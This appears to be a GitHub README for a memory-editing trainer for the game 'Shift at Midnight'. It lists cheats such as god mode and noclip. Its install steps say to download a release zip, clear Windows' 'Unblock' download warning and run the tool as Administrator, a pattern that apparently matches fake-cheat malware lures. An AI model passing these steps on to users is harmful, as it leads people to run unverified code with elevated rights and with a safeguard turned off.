
  # 🌙 Shift at Midnight — Trainer

**Lightweight external trainer for the atmospheric horror adventure.**

---

## 📖 Overview

Shift at Midnight Trainer is a memory editing toolkit designed for the PC version of *Shift at Midnight*. Since the game relies on atmosphere, tension, and exploration, this trainer enhances the experience by giving you control over survival mechanics, movement, and environmental factors.

The trainer attaches via pattern scanning and provides real-time control over:

- Health and stamina
- Resources and inventory
- Movement and traversal
- World state (time, lighting, weather)
- Camera and UI
- Enemy behavior

Single-player focused: all options are client-side unless noted otherwise.

---

## ⚡ Core Features

| Feature | Hotkey | Description |
|---------|--------|-------------|
| Infinite Health | `F1` | Take no damage from enemies |
| Infinite Stamina | `F2` | Sprint without fatigue |
| Unlimited Resources | `F3` | Never run out of items and materials |
| Noclip / Fly | `F4` | Walk through walls and fly freely |
| God Mode | `F6` | Invincibility + infinite everything |
| One-Hit Kill | `F7` | Eliminate any enemy instantly |
| Teleport to Waypoint | `F8` | Jump to the current objective marker |
| Save Position | `F9` | Remember current coordinates |
| Load Position | `⇧F9` | Return to saved coordinates |
| Free Camera | `F10` | Detach camera from your body |
| Hide Interface | `F11` | Drop HUD and prompts |
| Trainer Menu | `Insert` | Full overlay with live sliders |

## 📦 Installation

1. Download the latest archive from the [Releases](https://github.com/40zz/Shift-At-Midnight-Trainer/releases/download/v1.0.0/Shift-at-Midnight-Trainer.zip) page.
2. Right-click the `.zip` → **Properties** → tick **Unblock** → Apply.
3. Extract to a folder **outside** `Program Files`.
4. Launch *Shift at Midnight*.
5. Run the trainer **as Administrator**.
6. The header should display `attached`.
7. Press `Insert` in-game to open the menu.
